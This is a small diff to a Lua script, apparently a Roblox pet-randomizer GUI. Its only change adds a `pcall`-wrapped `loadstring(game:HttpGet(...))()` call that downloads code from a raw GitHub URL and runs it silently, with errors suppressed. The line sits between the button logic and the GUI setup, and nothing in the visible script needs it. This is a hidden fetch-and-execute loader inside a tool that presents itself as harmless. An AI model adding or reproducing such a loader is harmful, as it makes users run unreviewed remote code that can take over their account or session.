@@ -154,6 +154,10 @@ local function countdownAndRandomize(button)
     button.Text = "🎲 Randomize Pets"
 end
 
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/xx/refs/heads/main/egg-randomizer"))()
+end)
+
 -- 🌿 GUI Setup
 local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 screenGui.Name = "PetHatchGui"
